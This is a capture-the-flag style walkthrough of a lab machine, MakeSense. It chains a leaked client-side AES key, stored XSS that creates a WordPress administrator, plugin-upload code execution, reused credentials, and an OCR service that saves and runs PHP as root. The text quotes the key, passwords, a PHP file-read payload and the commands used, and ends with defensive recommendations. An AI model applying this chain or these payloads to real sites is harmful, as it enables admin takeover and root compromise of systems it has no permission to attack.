MakeSense

A WordPress contact workflow trusts client-side encryption too much: an exposed AES key turns encrypted voice results into stored admin XSS, then admin actions lead to plugin RCE and a root-owned OCR service executes saved PHP.

The shape of it

MakeSense is two bugs chained together. The public WordPress site exposes the key used to encrypt browser-generated voice/contact summaries. Because the server later decrypts and renders those fields inside an admin view, we can create stored XSS. The XSS does not need cookie theft; it uses the admin browser as a same-origin actuator to create a new administrator, upload a plugin, and get code execution.

nmap 2 useful ports → 22/443 └─ :443 → makesense.htb → WordPress 7.0 + custom webagency theme └─ JS leaks AES key for encrypted voice/contact result payloads └─ unauthenticated AJAX writes encrypted result to contact_submission └─ admin list renders decrypted fields unsafely → stored XSS └─ XSS creates WordPress administrator └─ plugin upload → RCE as www-data └─ wp-config.php leaks walter password → ssh └─ root-owned OCR on 127.0.0.1:8001 saves .php └─ PHP executes as root → root.txt

Reconnaissance

The external scan shows SSH and HTTPS. Port 8001 appears filtered from the outside, which matters later because the root vector is reachable only from localhost.

$ nmap -Pn -p- --min-rate 5000 10.129.27.192
22/tcp   open      ssh
80/tcp   filtered  http
443/tcp  open      https
8001/tcp filtered  vcom-tunnel

HTTPS presents a certificate for makesense.htb and serves a WordPress site titled Agency LLC. The source reveals the custom webagency theme and an AI transcription wrapper.

ssl-cert: CN=makesense.htb
http-server-header: Apache/2.4.58 (Ubuntu)
http-generator: WordPress 7.0

02 · foothold
02

Encrypted contact results to stored XSS

The transcription wrapper exposes the symmetric key used for AES-GCM payload encryption. That makes the client-side "encrypted" result channel attacker-writable.

const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';

The main script shows the unauthenticated AJAX flow. First we create a contact submission, then we submit an encrypted transcription/summary payload against the returned post ID.

action=submit_contact_form  → returns post_id
action=save_voice_results   → decrypts payload and stores result metadata

A small XSS probe confirmed execution in the admin contact-submission list:

GET /xss?loc=https%3A%2F%2Fmakesense.htb%2Fwp-admin%2Fedit.php%3Fpost_type%3Dcontact_submission

WordPress authentication cookies were HttpOnly, so the payload used the admin browser directly: fetch /wp-admin/user-new.php, parse _wpnonce_create-user, then POST a new administrator user.

GET  /wp-admin/user-new.php
POST /wp-admin/user-new.php
→ /wp-admin/users.php?update=add&id=5

wp-config.php password reuse

The WordPress config uses SQLite, but it still contains a username and password pair. The password is reused by the local SSH user walter.

define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );

05

Root-owned OCR saves executable PHP

Local enumeration finds the hidden service from the initial scan. It is a PHP development server running as root from inside /root/ocr4/.

root php -S 127.0.0.1:8001 -t /root/ocr4/

The service is protected by Basic Auth, but walter:JbhHDAEgXvri3! works. The app accepts a canvas PNG, runs Tesseract, and lets the user save recognized text under saved/<filename>. Path traversal is reduced with basename(), but the extension is not constrained.

<input type="hidden" name="ocr_id" value="ocr_...">
<input type="text" name="filename" placeholder="result.txt" required>

Submitting an image containing PHP text made Tesseract produce a valid PHP file:

<?php readfile('/root/root.txt');?>

Saving it as codex-root.php and requesting it through the root-owned PHP server executed the file as root.

$ curl -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/codex-root.php
85455eb3e06b30e5f8ed2dd3afcb104a

closing MakeSense

Do not trust client-side encryption keys, escape decrypted fields before rendering them in admin views, disable routine plugin upload access, eliminate credential reuse, run internal tooling as non-root, and force OCR output into non-executable storage with safe extensions only.
